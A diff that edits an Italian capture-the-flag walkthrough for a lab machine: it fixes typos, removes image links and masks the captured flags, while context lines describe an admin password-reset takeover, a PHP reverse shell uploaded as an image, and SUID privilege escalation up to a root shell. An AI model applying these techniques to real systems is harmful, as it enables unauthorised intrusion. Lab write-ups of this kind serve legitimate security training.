@@ -89,11 +89,7 @@ Content-Length: 162
 Connection: keep-alive
 ```
 
-Ispezioanndo la pagina e registrandomi vedo nelle impostazioni questa importante informazione:
-
-![[image 1.png]]
-
-Sappiamo quindi che l’email admin è `admin@sky.thm`
+Ispezionando la pagina e registrandomi, dalle impostazioni dell'account deduciamo che l'email dell'amministratore è `admin@sky.thm`.
 
 Inoltre analizzando bene c’è pure la pagina reset password, se il campo non è validato correttamente a lato backend possiamo forzare il cambio della password dell account admin!
 
@@ -186,8 +182,7 @@ Taking you back...
 ```
 
 Ora abbiamo accesso all’immagine e possiamo cambiarla, se non è validata corrrettamente possiamo caricare qualsiasi tipo di file..
-Ho caricato come immagine una reverse shell scritta in PHP grazie a RevShells [Reverse-Shell e Bind Shell](https://app.notion.com/p/Reverse-Shell-e-Bind-Shell-3d0ee36546c281a9bd75cc9b7ecb91d4?pvs=21)
-![[Pasted image 20260826223940.png]]
+Ho caricato come immagine una reverse shell scritta in PHP (generata ad esempio con RevShells):
 
 ```text
 <?php
@@ -346,10 +341,10 @@ www-data@ip-10-129-158-22:/home/ubuntu$ cd ../webdeveloper/
 www-data@ip-10-129-158-22:/home/webdeveloper$ ls
 user.txt
 www-data@ip-10-129-158-22:/home/webdeveloper$ cat user.txt 
-63191e4ece37523c9fe6bb62a5e64d45
+********************************
 ```
 
-Abbiamo ottenuto la prima flag `user.txt`. Ora dobbiamo fare Privileage Escalation ([Commands](https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21))
+Abbiamo ottenuto la prima flag `user.txt`. Ora dobbiamo fare Privilege Escalation:
 
 Procediamo a vedere quali file hanno il bit SUID 
 
@@ -855,6 +850,6 @@ uid=0(root) gid=0(root) groups=0(root)
 root@ip-10-129-158-22:/home/webdeveloper# ls /root
 root.txt
 root@ip-10-129-158-22:/home/webdeveloper# cat /root/root.txt 
-3a62d897c40a815ecbe267df2f533ac6
+********************************
 root@ip-10-129-158-22:/home/webdeveloper# 
 ```
